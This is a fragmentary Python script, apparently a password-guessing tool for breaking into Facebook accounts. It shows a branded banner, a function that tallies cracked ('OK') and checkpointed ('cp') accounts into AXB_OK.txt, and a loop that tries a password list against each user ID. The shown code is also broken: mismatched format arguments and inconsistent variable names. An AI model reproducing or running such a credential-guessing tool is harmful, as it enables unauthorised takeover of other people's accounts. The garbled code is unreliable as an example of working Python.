...
logo =                                          """   
   ...
   \033[1;37m##     ## ##     ## ########  
\x1b[1;97m------------------------\x1b[1;97m------------------------
\033[1;31m\033[1;37m Author \x1b[1;97m : \033[1;37m           Azan Ali
\033[1;31m\033[1;37m Facebook\x1b[1;97m:  \033[1;37m          Azan Ali
\033[1;31m\033[1;37m GitHub\x1b[1;97m  : \033[1;37m           Mr-Azan
...
def hasil(OK,cp):
	if not len(OK) != 0:
	    pass
	if len(cp) != 0:
	    print('\n\n  \x1b[1;97m Total OK : \x1b[1;97m %s  \x1b[1;97mAXB_OK.txt' % (H, P, str(len(ok))))
...
class __xxx__:
    ...
    def __metode__(self, user, __chi__, cebok):
        global ok,cp,loop
        sys.stdout.write(f"\r \x1b[1;97m[AXB] {loop}|{len(self.id)} [ok][{len(ok)}] [cp][{len(cp)}] ")
        sys.stdout.flush()
        try:
            for pw in __chi__:
                pw = pw.lower()
